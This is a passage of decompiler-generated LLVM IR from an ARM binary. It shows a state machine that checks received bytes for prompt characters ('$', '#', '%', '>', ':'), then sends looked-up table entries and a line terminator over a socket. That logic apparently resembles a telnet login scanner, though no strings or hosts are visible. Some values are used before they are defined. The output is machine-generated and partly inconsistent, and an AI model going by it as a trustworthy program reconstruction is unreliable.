  %v3_127c4 = load i32, i32* %v2_127c4, align 4
  store i32 %v3_127c4, i32* %ip.global-to-local, align 4
  %v1_127c8 = add i32 %v3_127c4, -1
  store i32 %v1_127c8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_127cc = icmp eq i32 %v1_127c8, 0
  store i1 %v2_127cc, i1* %cpsr_z.global-to-local, align 1
  %v5_127d0 = icmp sgt i32 %v1_127c8, 0
  br i1 %v5_127d0, label %dec_label_pc_127f0, label %dec_label_pc_12e38

dec_label_pc_127d8:                               ; preds = %bb326
  %v2_127d8 = icmp ugt i8 %v3_127f4, 35
  store i1 %v2_127d8, i1* %cpsr_c.global-to-local, align 1
  %v7_127d8 = icmp eq i8 %v3_127f4, 36
  store i1 %v7_127d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127d8, label %dec_label_pc_12804, label %dec_label_pc_127e0

dec_label_pc_127e0:                               ; preds = %dec_label_pc_127d8
  %v2_127e0 = icmp ugt i8 %v3_127f4, 34
  store i1 %v2_127e0, i1* %cpsr_c.global-to-local, align 1
  %v7_127e0 = icmp eq i8 %v3_127f4, 35
  store i1 %v7_127e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127e0, label %dec_label_pc_12804, label %dec_label_pc_127e8

dec_label_pc_127e8:                               ; preds = %dec_label_pc_127e0
  %v1_127e8 = add i32 %v0_12804, -1
  store i32 %v1_127e8, i32* %r0.global-to-local, align 4
  %v2_127e8 = icmp ne i32 %v0_12804, 0
  store i1 %v2_127e8, i1* %cpsr_c.global-to-local, align 1
  %v7_127e8 = icmp eq i32 %v0_12804, 1
  store i1 %v7_127e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127e8, label %dec_label_pc_12e38, label %dec_label_pc_127f0

dec_label_pc_127f0:                               ; preds = %dec_label_pc_127c4, %dec_label_pc_127e8
  %v0_12804 = phi i32 [ %v1_127e8, %dec_label_pc_127e8 ], [ %v1_127c8, %dec_label_pc_127c4 ]
  %v2_127f0 = add i32 %v0_12804, %v0_12508
  store i32 %v2_127f0, i32* %r3.global-to-local, align 4
  %v1_127f4 = add i32 %v2_127f0, 28
  %v2_127f4 = inttoptr i32 %v1_127f4 to i8*
  %v3_127f4 = load i8, i8* %v2_127f4, align 1
  %v4_127f4 = zext i8 %v3_127f4 to i32
  store i32 %v4_127f4, i32* %r3.global-to-local, align 4
  %v2_127f8 = icmp ugt i8 %v3_127f4, 61
  store i1 %v2_127f8, i1* %cpsr_c.global-to-local, align 1
  %v7_127f8 = icmp eq i8 %v3_127f4, 62
  store i1 %v7_127f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127f8, label %dec_label_pc_12804, label %bb326

bb326:                                            ; preds = %dec_label_pc_127f0
  %v3_127fc = icmp ugt i8 %v3_127f4, 57
  store i1 %v3_127fc, i1* %cpsr_c.global-to-local, align 1
  %v8_127fc = icmp eq i8 %v3_127f4, 58
  store i1 %v8_127fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_127fc, label %dec_label_pc_12804, label %dec_label_pc_127d8

dec_label_pc_12804:                               ; preds = %dec_label_pc_127f0, %bb326, %dec_label_pc_127e0, %dec_label_pc_127d8
  %v1_12804 = add i32 %v0_12804, 1
  store i32 %v1_12804, i32* @r7, align 4
  %v2_12808 = icmp eq i32 %v1_12804, -1
  store i1 %v2_12808, i1* %cpsr_c.global-to-local, align 1
  %v7_12808 = icmp eq i32 %v0_12804, -2
  store i1 %v7_12808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12808, label %dec_label_pc_12e38, label %dec_label_pc_12810

dec_label_pc_12810:                               ; preds = %dec_label_pc_12804, %dec_label_pc_12e38
  %v0_12810 = phi i32 [ %v5_12e48, %dec_label_pc_12e38 ], [ %v1_12804, %dec_label_pc_12804 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12810 = icmp eq i32 %v0_12810, 0
  store i1 %v2_12810, i1* %cpsr_z.global-to-local, align 1
  %tmp327 = icmp slt i32 %v0_12810, 1
  br i1 %tmp327, label %dec_label_pc_12618, label %dec_label_pc_12818

dec_label_pc_12818:                               ; preds = %dec_label_pc_12810
  %v0_12818 = load i32, i32* @r5, align 4
  %v1_12818 = inttoptr i32 %v0_12818 to i32*
  %v2_12818 = load i32, i32* %v1_12818, align 4
  store i32 %v2_12818, i32* %r3.global-to-local, align 4
  %v1_1281c = add i32 %v0_12818, 4
  %v2_1281c = inttoptr i32 %v1_1281c to i32*
  %v3_1281c = load i32, i32* %v2_1281c, align 4
  store i32 %v3_1281c, i32* %r0.global-to-local, align 4
  %v1_12820 = add i32 %v2_12818, 13
  %v2_12820 = inttoptr i32 %v1_12820 to i8*
  %v3_12820 = load i8, i8* %v2_12820, align 1
  %v4_12820 = zext i8 %v3_12820 to i32
  store i32 %v4_12820, i32* %r2.global-to-local, align 4
  %v1_12824 = add i32 %v2_12818, 4
  %v2_12824 = inttoptr i32 %v1_12824 to i32*
  %v3_12824 = load i32, i32* %v2_12824, align 4
  store i32 %v3_12824, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1282c = call i32 @_send(i32 %v3_1281c, i32 %v3_12824, i32 %v4_12820, i32 16384)
  store i32 %v4_1282c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_12834 = load i32, i32* @r5, align 4
  %v1_12834 = add i32 %v0_12834, 4
  %v2_12834 = inttoptr i32 %v1_12834 to i32*
  %v3_12834 = load i32, i32* %v2_12834, align 4
  store i32 %v3_12834, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_12840 = call i32 @_send(i32 %v3_12834, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2, i32 16384)
  store i32 %v4_12840, i32* %r0.global-to-local, align 4
  %v0_12844 = load i32, i32* @r5, align 4
  %v1_12844 = add i32 %v0_12844, 24
  %v2_12844 = inttoptr i32 %v1_12844 to i32*
  %v3_12844 = load i32, i32* %v2_12844, align 4
  store i32 %v3_12844, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_1284c = add i32 %v0_12844, 12
  %v3_1284c = inttoptr i32 %v2_1284c to i32*
  store i32 5, i32* %v3_1284c, align 4
  br label %dec_label_pc_12c58

dec_label_pc_12854:                               ; preds = %dec_label_pc_12508
  %v1_12854 = add i32 %v0_12508, 24
  %v2_12854 = inttoptr i32 %v1_12854 to i32*
  %v3_12854 = load i32, i32* %v2_12854, align 4
  store i32 %v3_12854, i32* %ip.global-to-local, align 4
  %v1_12858 = add i32 %v3_12854, -1
  store i32 %v1_12858, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1285c = icmp eq i32 %v1_12858, 0
  store i1 %v2_1285c, i1* %cpsr_z.global-to-local, align 1
  %v5_12860 = icmp sgt i32 %v1_12858, 0
  br i1 %v5_12860, label %dec_label_pc_12888, label %dec_label_pc_12488thread-pre-split.thread

dec_label_pc_12868:                               ; preds = %bb328
  %v2_12868 = icmp ugt i8 %v3_1288c, 35
  store i1 %v2_12868, i1* %cpsr_c.global-to-local, align 1
  %v7_12868 = icmp eq i8 %v3_1288c, 36
  store i1 %v7_12868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12868, label %dec_label_pc_1289c, label %dec_label_pc_12870

dec_label_pc_12870:                               ; preds = %dec_label_pc_12868
  %v2_12870 = icmp ugt i8 %v3_1288c, 34
  store i1 %v2_12870, i1* %cpsr_c.global-to-local, align 1
  %v7_12870 = icmp eq i8 %v3_1288c, 35
  store i1 %v7_12870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12870, label %dec_label_pc_1289c, label %dec_label_pc_12878

dec_label_pc_12878:                               ; preds = %dec_label_pc_12870
  %v2_12878 = icmp ugt i8 %v3_1288c, 36
  store i1 %v2_12878, i1* %cpsr_c.global-to-local, align 1
  %v7_12878 = icmp eq i8 %v3_1288c, 37
  store i1 %v7_12878, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12878, label %dec_label_pc_1289c, label %dec_label_pc_12880

dec_label_pc_12880:                               ; preds = %dec_label_pc_12878
  %v1_12880 = add i32 %v0_1289c, -1
  store i32 %v1_12880, i32* %r0.global-to-local, align 4
  %v2_12880 = icmp ne i32 %v0_1289c, 0
  store i1 %v2_12880, i1* %cpsr_c.global-to-local, align 1
  %v7_12880 = icmp eq i32 %v0_1289c, 1
  store i1 %v7_12880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12880, label %dec_label_pc_12488thread-pre-split, label %dec_label_pc_12888

dec_label_pc_12888:                               ; preds = %dec_label_pc_12854, %dec_label_pc_12880
  %v0_1289c = phi i32 [ %v1_12880, %dec_label_pc_12880 ], [ %v1_12858, %dec_label_pc_12854 ]
  %v2_12888 = add i32 %v0_1289c, %v0_12508
  store i32 %v2_12888, i32* %r3.global-to-local, align 4
  %v1_1288c = add i32 %v2_12888, 28
  %v2_1288c = inttoptr i32 %v1_1288c to i8*
  %v3_1288c = load i8, i8* %v2_1288c, align 1
  %v4_1288c = zext i8 %v3_1288c to i32
  store i32 %v4_1288c, i32* %r3.global-to-local, align 4
  %v2_12890 = icmp ugt i8 %v3_1288c, 61
  store i1 %v2_12890, i1* %cpsr_c.global-to-local, align 1
  %v7_12890 = icmp eq i8 %v3_1288c, 62
  store i1 %v7_12890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12890, label %dec_label_pc_1289c, label %bb328

bb328:                                            ; preds = %dec_label_pc_12888
  %v3_12894 = icmp ugt i8 %v3_1288c, 57
  store i1 %v3_12894, i1* %cpsr_c.global-to-local, align 1
  %v8_12894 = icmp eq i8 %v3_1288c, 58
  store i1 %v8_12894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12894, label %dec_label_pc_1289c, label %dec_label_pc_12868

dec_label_pc_1289c:                               ; preds = %dec_label_pc_12888, %bb328, %dec_label_pc_12878, %dec_label_pc_12870, %dec_label_pc_12868
  %v1_1289c = add i32 %v0_1289c, 1
  store i32 %v1_1289c, i32* @r7, align 4
  %v2_128a0 = icmp eq i32 %v1_1289c, -1
  store i1 %v2_128a0, i1* %cpsr_c.global-to-local, align 1
  %v7_128a0 = icmp eq i32 %v0_1289c, -2
  store i1 %v7_128a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_128a0, label %dec_label_pc_12488thread-pre-split, label %dec_label_pc_128a8

dec_label_pc_128a8:                               ; preds = %dec_label_pc_1289c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_128a8 = icmp eq i32 %v1_1289c, 0
  store i1 %v2_128a8, i1* %cpsr_z.global-to-local, align 1
  %tmp329 = icmp slt i32 %v1_1289c, 1
  br i1 %tmp329, label %dec_label_pc_12618, label %dec_label_pc_128b0

dec_label_pc_128b0:                               ; preds = %dec_label_pc_128a8
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_128b4 = call i32 @function_13128(i32 21)
  store i32 %v2_128bc, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_128c4 = call i32 @function_13044(i32 21, i32* nonnull %stack_var_-56)
  store i32 %v3_128c4, i32* %r0.global-to-local, align 4
  %v3_128c8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_128c8, i32* %r2.global-to-local, align 4
  store i32 %v3_128c4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_128d4 = load i32, i32* @r5, align 4
  %v1_128d4 = add i32 %v0_128d4, 4
  %v2_128d4 = inttoptr i32 %v1_128d4 to i32*
  %v3_128d4 = load i32, i32* %v2_128d4, align 4
  store i32 %v3_128d4, i32* %r0.global-to-local, align 4
  %v4_128d8 = call i32 @_send(i32 %v3_128d4, i32 %v3_128c4, i32 %v3_128c8, i32 16384)
  store i32 %v4_128d8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_128e8 = load i32, i32* @r5, align 4
  %v1_128e8 = add i32 %v0_128e8, 4
  %v2_128e8 = inttoptr i32 %v1_128e8 to i32*
  %v3_128e8 = load i32, i32* %v2_128e8, align 4
  store i32 %v3_128e8, i32* %r0.global-to-local, align 4
  %v4_128ec = call i32 @_send(i32 %v3_128e8, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2, i32 16384)
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_128f4 = call i32 @function_13070(i32 21)
  store i32 %v1_128f4, i32* %r0.global-to-local, align 4
  %v0_128f8 = load i32, i32* @r5, align 4
  %v1_128f8 = add i32 %v0_128f8, 24
  %v2_128f8 = inttoptr i32 %v1_128f8 to i32*
  %v3_128f8 = load i32, i32* %v2_128f8, align 4
  store i32 %v3_128f8, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_12900 = add i32 %v0_128f8, 12
  %v3_12900 = inttoptr i32 %v2_12900 to i32*
  store i32 6, i32* %v3_12900, align 4
  br label %dec_label_pc_12c58

dec_label_pc_12908:                               ; preds = %dec_label_pc_12508
  %v1_12908 = add i32 %v0_12508, 24
  %v2_12908 = inttoptr i32 %v1_12908 to i32*
  %v3_12908 = load i32, i32* %v2_12908, align 4
  store i32 %v3_12908, i32* %ip.global-to-local, align 4
  %v1_1290c = add i32 %v3_12908, -1
  store i32 %v1_1290c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12910 = icmp eq i32 %v1_1290c, 0
  store i1 %v2_12910, i1* %cpsr_z.global-to-local, align 1
  %v5_12914 = icmp sgt i32 %v1_1290c, 0
  br i1 %v5_12914, label %dec_label_pc_1293c, label %dec_label_pc_12488thread-pre-split.thread

dec_label_pc_1291c:                               ; preds = %bb330
  %v2_1291c = icmp ugt i8 %v3_12940, 35
  store i1 %v2_1291c, i1* %cpsr_c.global-to-local, align 1
  %v7_1291c = icmp eq i8 %v3_12940, 36
  store i1 %v7_1291c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1291c, label %dec_label_pc_12950, label %dec_label_pc_12924

dec_label_pc_12924:                               ; preds = %dec_label_pc_1291c
  %v2_12924 = icmp ugt i8 %v3_12940, 34
  store i1 %v2_12924, i1* %cpsr_c.global-to-local, align 1
  %v7_12924 = icmp eq i8 %v3_12940, 35
  store i1 %v7_12924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12924, label %dec_label_pc_12950, label %dec_label_pc_1292c

dec_label_pc_1292c:                               ; preds = %dec_label_pc_12924
  %v2_1292c = icmp ugt i8 %v3_12940, 36
  store i1 %v2_1292c, i1* %cpsr_c.global-to-local, align 1
  %v7_1292c = icmp eq i8 %v3_12940, 37
  store i1 %v7_1292c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1292c, label %dec_label_pc_12950, label %dec_label_pc_12934

dec_label_pc_12934:                               ; preds = %dec_label_pc_1292c
  %v1_12934 = add i32 %v0_12950, -1
  store i32 %v1_12934, i32* %r0.global-to-local, align 4
  %v2_12934 = icmp ne i32 %v0_12950, 0
  store i1 %v2_12934, i1* %cpsr_c.global-to-local, align 1
  %v7_12934 = icmp eq i32 %v0_12950, 1
  store i1 %v7_12934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12934, label %dec_label_pc_12488thread-pre-split, label %dec_label_pc_1293c

dec_label_pc_1293c:                               ; preds = %dec_label_pc_12908, %dec_label_pc_12934
  %v0_12950 = phi i32 [ %v1_12934, %dec_label_pc_12934 ], [ %v1_1290c, %dec_label_pc_12908 ]
  %v2_1293c = add i32 %v0_12950, %v0_12508
  store i32 %v2_1293c, i32* %r3.global-to-local, align 4
  %v1_12940 = add i32 %v2_1293c, 28
  %v2_12940 = inttoptr i32 %v1_12940 to i8*
  %v3_12940 = load i8, i8* %v2_12940, align 1
  %v4_12940 = zext i8 %v3_12940 to i32
  store i32 %v4_12940, i32* %r3.global-to-local, align 4
  %v2_12944 = icmp ugt i8 %v3_12940, 61
  store i1 %v2_12944, i1* %cpsr_c.global-to-local, align 1
  %v7_12944 = icmp eq i8 %v3_12940, 62
  store i1 %v7_12944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12944, label %dec_label_pc_12950, label %bb330

bb330:                                            ; preds = %dec_label_pc_1293c
  %v3_12948 = icmp ugt i8 %v3_12940, 57
  store i1 %v3_12948, i1* %cpsr_c.global-to-local, align 1
  %v8_12948 = icmp eq i8 %v3_12940, 58
  store i1 %v8_12948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12948, label %dec_label_pc_12950, label %dec_label_pc_1291c

dec_label_pc_12950:                               ; preds = %dec_label_pc_1293c, %bb330, %dec_label_pc_1292c, %dec_label_pc_12924, %dec_label_pc_1291c
  %v1_12950 = add i32 %v0_12950, 1
  store i32 %v1_12950, i32* @r7, align 4
  %v2_12954 = icmp eq i32 %v1_12950, -1
  store i1 %v2_12954, i1* %cpsr_c.global-to-local, align 1
  %v7_12954 = icmp eq i32 %v0_12950, -2
  store i1 %v7_12954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12954, label %dec_label_pc_12488thread-pre-split, label %dec_label_pc_1295c

dec_label_pc_1295c:                               ; preds = %dec_label_pc_12950
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1295c = icmp eq i32 %v1_12950, 0
  store i1 %v2_1295c, i1* %cpsr_z.global-to-local, align 1
  %tmp331 = icmp slt i32 %v1_12950, 1
  br i1 %tmp331, label %dec_label_pc_12618, label %dec_label_pc_12964

dec_label_pc_12964:                               ; preds = %dec_label_pc_1295c
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_12968 = call i32 @function_13128(i32 22)
  store i32 %v2_12970, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_12978 = call i32 @function_13044(i32 22, i32* nonnull %stack_var_-48)
  store i32 %v3_12978, i32* %r0.global-to-local, align 4
  %v3_1297c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1297c, i32* %r2.global-to-local, align 4
  store i32 %v3_12978, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12988 = load i32, i32* @r5, align 4
  %v1_12988 = add i32 %v0_12988, 4
  %v2_12988 = inttoptr i32 %v1_12988 to i32*
  %v3_12988 = load i32, i32* %v2_12988, align 4
  store i32 %v3_12988, i32* %r0.global-to-local, align 4
  %v4_1298c = call i32 @_send(i32 %v3_12988, i32 %v3_12978, i32 %v3_1297c, i32 16384)
  store i32 %v4_1298c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1299c = load i32, i32* @r5, align 4
  %v1_1299c = add i32 %v0_1299c, 4
  %v2_1299c = inttoptr i32 %v1_1299c to i32*
  %v3_1299c = load i32, i32* %v2_1299c, align 4
  store i32 %v3_1299c, i32* %r0.global-to-local, align 4
  %v4_129a0 = call i32 @_send(i32 %v3_1299c, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2, i32 16384)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_129a8 = call i32 @function_13070(i32 22)
  store i32 %v1_129a8, i32* %r0.global-to-local, align 4
  %v0_129ac = load i32, i32* @r5, align 4
  %v1_129ac = add i32 %v0_129ac, 24
  %v2_129ac = inttoptr i32 %v1_129ac to i32*
  %v3_129ac = load i32, i32* %v2_129ac, align 4
  store i32 %v3_129ac, i32* %ip.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v2_129b4 = add i32 %v0_129ac, 12
  %v3_129b4 = inttoptr i32 %v2_129b4 to i32*
  store i32 7, i32* %v3_129b4, align 4
  br label %dec_label_pc_12c58

dec_label_pc_129bc:                               ; preds = %dec_label_pc_12508
  %v1_129bc = add i32 %v0_12508, 24
  %v2_129bc = inttoptr i32 %v1_129bc to i32*
  %v3_129bc = load i32, i32* %v2_129bc, align 4
  store i32 %v3_129bc, i32* %ip.global-to-local, align 4
  %v1_129c0 = add i32 %v3_129bc, -1
  store i32 %v1_129c0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_129c4 = icmp eq i32 %v1_129c0, 0
  store i1 %v2_129c4, i1* %cpsr_z.global-to-local, align 1
  %v5_129c8 = icmp sgt i32 %v1_129c0, 0
  br i1 %v5_129c8, label %dec_label_pc_129f0, label %dec_label_pc_12488thread-pre-split.thread

dec_label_pc_129d0:                               ; preds = %bb332
  %v2_129d0 = icmp ugt i8 %v3_129f4, 35
  store i1 %v2_129d0, i1* %cpsr_c.global-to-local, align 1
  %v7_129d0 = icmp eq i8 %v3_129f4, 36
  store i1 %v7_129d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129d0, label %dec_label_pc_12a04, label %dec_label_pc_129d8

dec_label_pc_129d8:                               ; preds = %dec_label_pc_129d0
  %v2_129d8 = icmp ugt i8 %v3_129f4, 34
  store i1 %v2_129d8, i1* %cpsr_c.global-to-local, align 1
  %v7_129d8 = icmp eq i8 %v3_129f4, 35
  store i1 %v7_129d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129d8, label %dec_label_pc_12a04, label %dec_label_pc_129e0

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129d8
  %v2_129e0 = icmp ugt i8 %v3_129f4, 36
  store i1 %v2_129e0, i1* %cpsr_c.global-to-local, align 1
  %v7_129e0 = icmp eq i8 %v3_129f4, 37
  store i1 %v7_129e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129e0, label %dec_label_pc_12a04, label %dec_label_pc_129e8

dec_label_pc_129e8:                               ; preds = %dec_label_pc_129e0
  %v1_129e8 = add i32 %v0_12a04, -1
  store i32 %v1_129e8, i32* %r0.global-to-local, align 4
  %v2_129e8 = icmp ne i32 %v0_12a04, 0
  store i1 %v2_129e8, i1* %cpsr_c.global-to-local, align 1
  %v7_129e8 = icmp eq i32 %v0_12a04, 1
  store i1 %v7_129e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129e8, label %dec_label_pc_12488thread-pre-split, label %dec_label_pc_129f0

dec_label_pc_129f0:                               ; preds = %dec_label_pc_129bc, %dec_label_pc_129e8
  %v0_12a04 = phi i32 [ %v1_129e8, %dec_label_pc_129e8 ], [ %v1_129c0, %dec_label_pc_129bc ]
  %v2_129f0 = add i32 %v0_12a04, %v0_12508
  store i32 %v2_129f0, i32* %r3.global-to-local, align 4
  %v1_129f4 = add i32 %v2_129f0, 28
  %v2_129f4 = inttoptr i32 %v1_129f4 to i8*
  %v3_129f4 = load i8, i8* %v2_129f4, align 1
  %v4_129f4 = zext i8 %v3_129f4 to i32
  store i32 %v4_129f4, i32* %r3.global-to-local, align 4
  %v2_129f8 = icmp ugt i8 %v3_129f4, 61
  store i1 %v2_129f8, i1* %cpsr_c.global-to-local, align 1
  %v7_129f8 = icmp eq i8 %v3_129f4, 62
  store i1 %v7_129f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129f8, label %dec_label_pc_12a04, label %bb332

bb332:                                            ; preds = %dec_label_pc_129f0
  %v3_129fc = icmp ugt i8 %v3_129f4, 57
  store i1 %v3_129fc, i1* %cpsr_c.global-to-local, align 1
  %v8_129fc = icmp eq i8 %v3_129f4, 58
  store i1 %v8_129fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_129fc, label %dec_label_pc_12a04, label %dec_label_pc_129d0

dec_label_pc_12a04:                               ; preds = %dec_label_pc_129f0, %bb332, %dec_label_pc_129e0, %dec_label_pc_129d8, %dec_label_pc_129d0
  %v1_12a04 = add i32 %v0_12a04, 1
  store i32 %v1_12a04, i32* @r7, align 4
  %v2_12a08 = icmp eq i32 %v1_12a04, -1
  store i1 %v2_12a08, i1* %cpsr_c.global-to-local, align 1
  %v7_12a08 = icmp eq i32 %v0_12a04, -2
  store i1 %v7_12a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12a08, label %dec_label_pc_12488thread-pre-split, label %dec_label_pc_12a10

dec_label_pc_12a10:                               ; preds = %dec_label_pc_12a04
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12a10 = icmp eq i32 %v1_12a04, 0
  store i1 %v2_12a10, i1* %cpsr_z.global-to-local, align 1
  %tmp333 = icmp slt i32 %v1_12a04, 1
  br i1 %tmp333, label %dec_label_pc_12618, label %dec_label_pc_12a18

dec_label_pc_12a18:                               ; preds = %dec_label_pc_12a10
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_12a1c = call i32 @function_13128(i32 23)
  store i32 %v2_128bc, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_12a2c = call i32 @function_13044(i32 23, i32* nonnull %stack_var_-56)
  store i32 %v3_12a2c, i32* %r0.global-to-local, align 4
  %v3_12a30 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_12a30, i32* %r2.global-to-local, align 4
  store i32 %v3_12a2c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12a3c = load i32, i32* @r5, align 4
  %v1_12a3c = add i32 %v0_12a3c, 4
  %v2_12a3c = inttoptr i32 %v1_12a3c to i32*
  %v3_12a3c = load i32, i32* %v2_12a3c, align 4
  store i32 %v3_12a3c, i32* %r0.global-to-local, align 4
  %v4_12a40 = call i32 @_send(i32 %v3_12a3c, i32 %v3_12a2c, i32 %v3_12a30, i32 16384)
  store i32 %v4_12a40, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12a50 = load i32, i32* @r5, align 4
  %v1_12a50 = add i32 %v0_12a50, 4
  %v2_12a50 = inttoptr i32 %v1_12a50 to i32*
  %v3_12a50 = load i32, i32* %v2_12a50, align 4
  store i32 %v3_12a50, i32* %r0.global-to-local, align 4
  %v4_12a54 = call i32 @_send(i32 %v3_12a50, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32 2, i32 16384)
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_12a5c = call i32 @function_13070(i32 23)
  store i32 %v1_12a5c, i32* %r0.global-to-local, align 4
  %v0_12a60 = load i32, i32* @r5, align 4
  %v1_12a60 = add i32 %v0_12a60, 24
  %v2_12a60 = inttoptr i32 %v1_12a60 to i32*
  %v3_12a60 = load i32, i32* %v2_12a60, align 4
  store i32 %v3_12a60, i32* %ip.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_12a68 = add i32 %v0_12a60, 12
  %v3_12a68 = inttoptr i32 %v2_12a68 to i32*
  store i32 9, i32* %v3_12a68, align 4
  br label %dec_label_pc_12c58

dec_label_pc_12a70:                               ; preds = %dec_label_pc_12508
  %v1_12a70 = add i32 %v0_12508, 24
  %v2_12a70 = inttoptr i32 %v1_12a70 to i32*
  %v3_12a70 = load i32, i32* %v2_12a70, align 4
  store i32 %v3_12a70, i32* %ip.global-to-local, align 4
  %v1_12a74 = add i32 %v3_12a70, -1
  store i32 %v1_12a74, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12a78 = icmp eq i32 %v1_12a74, 0
  store i1 %v2_12a78, i1* %cpsr_z.global-to-local, align 1
  %v5_12a7c = icmp sgt i32 %v1_12a74, 0
  br i1 %v5_12a7c, label %dec_label_pc_12aa4, label %dec_label_pc_12488thread-pre-split.thread

dec_label_pc_12a84:                               ; preds = %bb334
  %v2_12a84 = icmp ugt i8 %v3_12aa8, 35
  store i1 %v2_12a84, i1* %cpsr_c.global-to-local, align 1
  %v7_12a84 = icmp eq i8 %v3_12aa8, 36
  store i1 %v7_12a84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12a84, label %dec_label_pc_12ab8, label %dec_label_pc_12a8c

dec_label_pc_12a8c:                               ; preds = %dec_label_pc_12a84
  %v2_12a8c = icmp ugt i8 %v3_12aa8, 34
  store i1 %v2_12a8c, i1* %cpsr_c.global-to-local, align 1
  %v7_12a8c = icmp eq i8 %v3_12aa8, 35
  store i1 %v7_12a8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12a8c, label %dec_label_pc_12ab8, label %dec_label_pc_12a94

dec_label_pc_12a94:                               ; preds = %dec_label_pc_12a8c
  %v2_12a94 = icmp ugt i8 %v3_12aa8, 36
  store i1 %v2_12a94, i1* %cpsr_c.global-to-local, align 1
  %v7_12a94 = icmp eq i8 %v3_12aa8, 37
  store i1 %v7_12a94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12a94, label %dec_label_pc_12ab8, label %dec_label_pc_12a9c

dec_label_pc_12a9c:                               ; preds = %dec_label_pc_12a94
  %v1_12a9c = add i32 %v0_12ab8, -1
  store i32 %v1_12a9c, i32* %r0.global-to-local, align 4
  %v2_12a9c = icmp ne i32 %v0_12ab8, 0
  store i1 %v2_12a9c, i1* %cpsr_c.global-to-local, align 1
  %v7_12a9c = icmp eq i32 %v0_12ab8, 1
